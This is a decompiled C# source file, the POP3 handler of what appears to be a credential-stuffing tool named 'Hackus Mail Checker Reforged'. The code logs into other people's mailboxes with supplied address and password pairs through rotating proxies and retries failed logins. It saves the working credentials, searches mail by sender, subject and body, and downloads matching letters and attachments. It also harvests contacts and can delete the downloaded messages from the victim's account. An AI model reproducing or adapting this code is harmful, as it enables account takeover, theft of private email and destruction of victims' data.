using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.IMAP;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Mail.Utilities;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using HandyControl.Tools.Extension;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net.Mail.POP3
{
	// Token: 0x0200010F RID: 271
	public class Pop3Handler : IMailHandler
	{
		// Token: 0x170001A4 RID: 420
		// (get) Token: 0x0600084B RID: 2123 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x0600084C RID: 2124 RVA: 0x0000B030 File Offset: 0x00009230
		public Pop3Handler(Mailbox mailbox, Server server)
		{
			this._mailbox = mailbox;
			this._server = server;
		}

		// Token: 0x0600084D RID: 2125 RVA: 0x00032818 File Offset: 0x00030A18
		public OperationResult Connect(ProxyClient proxyClient)
		{
			OperationResult result;
			try
			{
				this._tcpClient = proxyClient.CreateConnection(this._server.Hostname, this._server.Port, null);
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					result = OperationResult.Ok;
				}
				else
				{
					result = OperationResult.Error;
				}
			}
			catch (SocketException ex)
			{
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					this._tcpClient.DisposeObject();
				}
				if (ex.SocketErrorCode == SocketError.HostNotFound)
				{
					result = OperationResult.HostNotFound;
				}
				else
				{
					result = OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					this._tcpClient.DisposeObject();
				}
				result = OperationResult.Error;
			}
			return result;
		}

		// Token: 0x0600084E RID: 2126 RVA: 0x000328EC File Offset: 0x00030AEC
		public OperationResult Login(out ExceptionType exceptionType)
		{
			exceptionType = ExceptionType.Undefined;
			this._pop3Client = new Pop3Client();
			int num = CheckerSettings.Instance.Timeout * 1000;
			this._pop3Client.ConnectTimeout = num;
			this._pop3Client.ReadWriteTimeout = num;
			try
			{
				this._pop3Client.Connect(this._server.Hostname, this._server.Port, this._server.Socket == Hackus_Mail_Checker_Reforged.Models.Enums.SocketType.SSL, this._tcpClient);
				this.WaitPause();
				this._pop3Client.Authenticate(this._mailbox.Address, this._mailbox.Password);
				return OperationResult.Ok;
			}
			catch (SocketException ex)
			{
				exceptionType = ExceptionType.SocketException;
				if (ex.SocketErrorCode == SocketError.HostNotFound)
				{
					return OperationResult.HostNotFound;
				}
				return OperationResult.Error;
			}
			catch (MailException ex2)
			{
				if (ex2.IsServerDisabled())
				{
					return OperationResult.ServerDisabled;
				}
				if (!ex2.IsBlocked())
				{
					StatisticsManager.Instance.AddBadDetails(this._mailbox.Address, ex2.Message);
					return OperationResult.Bad;
				}
				return OperationResult.Blocked;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch (IOException)
			{
				exceptionType = ExceptionType.IOException;
			}
			catch (TimeoutException)
			{
				exceptionType = ExceptionType.TimeoutException;
			}
			catch
			{
			}
			return OperationResult.Error;
		}

		// Token: 0x0600084F RID: 2127 RVA: 0x00032A44 File Offset: 0x00030C44
		public void SearchMessages()
		{
			int messagesCount = this.GetMessagesCount();
			if (messagesCount < 1)
			{
				return;
			}
			List<MailMessage> savedMessages = new List<MailMessage>();
			List<decimal> checkedUids = new List<decimal>();
			List<Request> list = new List<Request>();
			List<decimal> savedAttachmentsUids = new List<decimal>();
			OperationResult operationResult = OperationResult.Retry;
			int num = 0;
			while (operationResult == OperationResult.Retry)
			{
				operationResult = this.ProcessSearch(messagesCount, savedMessages, checkedUids, list, savedAttachmentsUids);
				if (operationResult == OperationResult.Error)
				{
					if (num >= 2)
					{
						break;
					}
					num++;
					operationResult = OperationResult.Retry;
				}
				if (operationResult != OperationResult.Ok && !this.Reconnect())
				{
					break;
				}
			}
			HashSet<Uid> hashSet = new HashSet<Uid>();
			foreach (Request request in list)
			{
				int count = request.FindedUids.Count;
				if (count > 0)
				{
					if (this.SearchSettings.UseSearchLimit && this.SearchSettings.SearchLimit > count)
					{
						continue;
					}
					MailboxResult result = new MailboxResult(this._mailbox, request.ToString(), count);
					MailManager.Instance.AddResult(result);
					StatisticsManager.Instance.IncrementFound();
					FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request.ToString(), count);
				}
				if (this.SearchSettings.DeleteWhenDownloaded)
				{
					hashSet.AddRange(request.SavedUids);
				}
			}
			if (hashSet.Any<Uid>())
			{
				this.DeleteMessages(hashSet);
				this.Quit();
			}
		}

		// Token: 0x06000850 RID: 2128 RVA: 0x00032BB0 File Offset: 0x00030DB0
		private OperationResult ProcessSearch(int count, List<MailMessage> savedMessages, List<decimal> checkedUids, List<Request> checkedRequests, List<decimal> savedAttachmentsUids)
		{
			Request request3 = null;
			try
			{
				while (count > 0 && (!CheckerSettings.Instance.UsePop3Limit || CheckerSettings.Instance.Pop3Limit > savedMessages.Count))
				{
					if (!savedMessages.Any((MailMessage m) => m.Uid.UID == count))
					{
						this.WaitPause();
						MailMessage mailMessage = this._pop3Client.FetchMessage(new Uid(count), true, true);
						savedMessages.Add(mailMessage);
						if (this.SearchSettings.ParseContacts)
						{
							Match match = Regex.Match(mailMessage.From, <Module>.smethod_4<string>(-1958406388));
							if (match.Success)
							{
								ContactsHelper.AddContact(match.Groups[1].Value);
							}
						}
					}
					int i = count;
					count = i - 1;
				}
				int j = 0;
				while (j < savedMessages.Count)
				{
					this.WaitPause();
					try
					{
						if (checkedUids.Contains(savedMessages[j].Uid.UID))
						{
							goto IL_C41;
						}
						if (savedMessages[j] != null)
						{
							Uid uid = new Uid(savedMessages[j].Uid.UID);
							using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
							{
								while (enumerator.MoveNext())
								{
									Request request = enumerator.Current;
									if (!SearchSettings.Instance.Search)
									{
										break;
									}
									if (request.CheckDate)
									{
										if (request.DateFrom != null && savedMessages[j].Date < request.DateFrom.Value)
										{
											continue;
										}
										if (request.DateTo != null)
										{
											if (savedMessages[j].Date > request.DateTo.Value.AddDays(1.0))
											{
												continue;
											}
										}
									}
									else if (this.SearchSettings.CheckDate && ((this.SearchSettings.DateFrom != null && savedMessages[j].Date < this.SearchSettings.DateFrom.Value) || (this.SearchSettings.DateTo != null && savedMessages[j].Date > this.SearchSettings.DateTo.Value.AddDays(1.0))))
									{
										continue;
									}
									Request request2 = checkedRequests.FirstOrDefault((Request r) => Pop3Handler.<>c__DisplayClass10_1.smethod_0(r.Sender, request.Sender) && Pop3Handler.<>c__DisplayClass10_1.smethod_0(r.Body, request.Body) && Pop3Handler.<>c__DisplayClass10_1.smethod_0(r.Subject, request.Subject));
									if (request2 == null)
									{
										request2 = request.Clone();
										request2.FindedUids = new HashSet<Uid>();
										request2.SavedUids = new HashSet<Uid>();
										checkedRequests.Add(request2);
									}
									else if (request2.IsChecked || (request2.SavedUids != null && request2.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit))
									{
										continue;
									}
									request3 = request2;
									if (request2.Sender != null && request2.Body == null && request2.Subject == null)
									{
										if (!string.IsNullOrEmpty(savedMessages[j].From) && savedMessages[j].From.ContainsIgnoreCase(request2.Sender))
										{
											request2.AddFindedUid(uid);
											if (this.SearchSettings.DownloadLetters)
											{
												this.WaitPause();
												savedMessages[j] = this._pop3Client.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments);
												if (savedMessages[j].AlternateViews.Count != 0)
												{
													request2.SavedUids.Add(uid);
													FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
												}
											}
										}
									}
									else if (request2.Sender == null && request2.Body == null && request2.Subject != null)
									{
										if (!string.IsNullOrEmpty(savedMessages[j].Subject) && savedMessages[j].Subject.ContainsIgnoreCase(request2.Subject))
										{
											request2.AddFindedUid(uid);
											if (this.SearchSettings.DownloadLetters)
											{
												this.WaitPause();
												savedMessages[j] = this._pop3Client.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments);
												if (savedMessages[j].AlternateViews.Count != 0)
												{
													request2.SavedUids.Add(uid);
													FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
												}
											}
										}
									}
									else if (request2.Sender != null && request2.Body == null && request2.Subject != null)
									{
										if (!string.IsNullOrEmpty(savedMessages[j].From) && savedMessages[j].From.ContainsIgnoreCase(request2.Sender) && !string.IsNullOrEmpty(savedMessages[j].Subject) && savedMessages[j].Subject.ContainsIgnoreCase(request2.Subject))
										{
											request2.AddFindedUid(uid);
											if (this.SearchSettings.DownloadLetters)
											{
												this.WaitPause();
												savedMessages[j] = this._pop3Client.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments);
												if (savedMessages[j].AlternateViews.Count != 0)
												{
													request2.SavedUids.Add(uid);
													FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
												}
											}
										}
									}
									else if (request2.Sender == null && request2.Body != null && request2.Subject == null)
									{
										if (savedMessages[j].AlternateViews.Count == 0)
										{
											this.WaitPause();
											savedMessages[j] = this._pop3Client.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments);
										}
										if (!string.IsNullOrEmpty(savedMessages[j].Body) && savedMessages[j].Body.ContainsIgnoreCase(request2.Body))
										{
											request2.AddFindedUid(uid);
											if (this.SearchSettings.DownloadLetters && savedMessages[j].AlternateViews.Count != 0)
											{
												request2.SavedUids.Add(uid);
												FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
											}
										}
									}
									else if (request2.Sender != null && request2.Body != null && request2.Subject == null)
									{
										if (!string.IsNullOrEmpty(savedMessages[j].From) && savedMessages[j].From.ContainsIgnoreCase(request2.Sender))
										{
											if (savedMessages[j].AlternateViews.Count == 0)
											{
												this.WaitPause();
												savedMessages[j] = this._pop3Client.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments);
											}
											if (!string.IsNullOrEmpty(savedMessages[j].Body) && savedMessages[j].Body.ContainsIgnoreCase(request2.Body))
											{
												request2.AddFindedUid(uid);
												if (this.SearchSettings.DownloadLetters && savedMessages[j].AlternateViews.Count != 0)
												{
													request2.SavedUids.Add(uid);
													FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
												}
											}
										}
									}
									else if (request2.Sender == null && request2.Body != null && request2.Subject != null)
									{
										if (!string.IsNullOrEmpty(savedMessages[j].Subject) && savedMessages[j].Subject.ContainsIgnoreCase(request2.Subject))
										{
											if (savedMessages[j].AlternateViews.Count == 0)
											{
												this.WaitPause();
												savedMessages[j] = this._pop3Client.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments);
											}
											if (!string.IsNullOrEmpty(savedMessages[j].Body) && savedMessages[j].Body.ContainsIgnoreCase(request2.Body))
											{
												request2.AddFindedUid(uid);
												if (this.SearchSettings.DownloadLetters && savedMessages[j].AlternateViews.Count != 0)
												{
													request2.SavedUids.Add(uid);
													FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
												}
											}
										}
									}
									else if (request2.Sender != null && request2.Body != null && request2.Subject != null && !string.IsNullOrEmpty(savedMessages[j].From) && savedMessages[j].From.ContainsIgnoreCase(request2.Sender) && !string.IsNullOrEmpty(savedMessages[j].Subject) && savedMessages[j].Subject.ContainsIgnoreCase(request2.Subject))
									{
										if (savedMessages[j].AlternateViews.Count == 0)
										{
											this.WaitPause();
											savedMessages[j] = this._pop3Client.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments);
										}
										if (!string.IsNullOrEmpty(savedMessages[j].Body) && savedMessages[j].Body.ContainsIgnoreCase(request2.Body))
										{
											request2.AddFindedUid(uid);
											if (this.SearchSettings.DownloadLetters && savedMessages[j].AlternateViews.Count != 0)
											{
												request2.SavedUids.Add(uid);
												FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
											}
										}
									}
								}
							}
							goto IL_C4C;
						}
						checkedUids.Add(savedMessages[j].Uid.UID);
						goto IL_C41;
					}
					catch (ThreadAbortException)
					{
						throw;
					}
					catch (Exception ex)
					{
						if ((!(ex is IOException) && !(ex is SocketException) && !(ex is TimeoutException) && !(ex is ArgumentNullException) && !(ex is NullReferenceException)) || request3 == null)
						{
							goto IL_C4C;
						}
						if (request3.Errors > 2)
						{
							request3.IsChecked = true;
							return OperationResult.Retry;
						}
						request3.Errors++;
						request3.IsChecked = false;
						return OperationResult.Retry;
					}
					goto IL_BC5;
					IL_C41:
					j++;
					continue;
					IL_C29:
					checkedUids.Add(savedMessages[j].Uid.UID);
					goto IL_C41;
					IL_BC5:
					if (this.SearchSettings.SearchAttachments && !savedAttachmentsUids.Contains(savedMessages[j].Uid.UID))
					{
						this.WaitPause();
						FileManager.SaveAttachments(savedMessages[j].AdditionalFiles, this._mailbox.Address);
						savedAttachmentsUids.Add(savedMessages[j].Uid.UID);
						goto IL_C29;
					}
					goto IL_C29;
					IL_C4C:
					if (savedMessages[j].AdditionalFiles.Any<Attachment>())
					{
						goto IL_BC5;
					}
					goto IL_C29;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				return OperationResult.Error;
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000851 RID: 2129 RVA: 0x000338B0 File Offset: 0x00031AB0
		private int GetMessagesCount()
		{
			for (int i = 0; i < CheckerSettings.Instance.Rebrute + 1; i++)
			{
				this.WaitPause();
				try
				{
					return this._pop3Client.GetMessagesCount();
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch (MailException)
				{
					return -1;
				}
				catch
				{
				}
			}
			return -1;
		}

		// Token: 0x06000852 RID: 2130 RVA: 0x00033920 File Offset: 0x00031B20
		private void DeleteMessages(IEnumerable<Uid> uids)
		{
			foreach (Uid uid in uids)
			{
				this.WaitPause();
				try
				{
					this._pop3Client.DeleteMessage(uid.UID);
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch (MailException)
				{
					break;
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000853 RID: 2131 RVA: 0x000339A8 File Offset: 0x00031BA8
		private void Quit()
		{
			try
			{
				this._pop3Client.Quit();
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
		}

		// Token: 0x06000854 RID: 2132 RVA: 0x000339E4 File Offset: 0x00031BE4
		private bool Reconnect()
		{
			for (int i = 0; i < CheckerSettings.Instance.Rebrute + 1; i++)
			{
				if (ProxySettings.Instance.UseProxy)
				{
					OperationResult operationResult = this.CreateConnection();
					if (operationResult != OperationResult.HostNotFound)
					{
						if (operationResult != OperationResult.Error)
						{
							goto IL_22;
						}
					}
					return false;
				}
				IL_22:
				this.WaitPause();
				ExceptionType exceptionType;
				OperationResult operationResult2 = this.Login(out exceptionType);
				if (operationResult2 == OperationResult.Ok)
				{
					return true;
				}
				if (operationResult2 == OperationResult.Blocked)
				{
					return false;
				}
				if (operationResult2 != OperationResult.Error)
				{
					this._pop3Client.Dispose();
					return false;
				}
				this._pop3Client.Dispose();
			}
			return false;
		}

		// Token: 0x06000855 RID: 2133 RVA: 0x00033A64 File Offset: 0x00031C64
		private OperationResult CreateConnection()
		{
			OperationResult operationResult;
			do
			{
				this.WaitPause();
				ProxyClient proxy = ProxyManager.Instance.GetProxy();
				operationResult = this.Connect(proxy);
			}
			while (operationResult == OperationResult.Error);
			return operationResult;
		}

		// Token: 0x06000856 RID: 2134 RVA: 0x0000B046 File Offset: 0x00009246
		public void Dispose()
		{
			this._pop3Client.Dispose();
		}

		// Token: 0x06000857 RID: 2135 RVA: 0x00033A90 File Offset: 0x00031C90
		public OperationResult SelectFolder(Hackus_Mail_Checker_Reforged.Net.Mail.IMAP.Folder folder)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					if (this._pop3Client.GetMessagesCount() == -1)
					{
						return OperationResult.Error;
					}
					return OperationResult.Ok;
				}
				catch (AlertException)
				{
					return OperationResult.Bad;
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.Error;
		}

		// Token: 0x06000858 RID: 2136 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x0400041C RID: 1052
		private TcpClient _tcpClient;

		// Token: 0x0400041D RID: 1053
		private Mailbox _mailbox;

		// Token: 0x0400041E RID: 1054
		private Server _server;

		// Token: 0x0400041F RID: 1055
		private Pop3Client _pop3Client;
	}
}
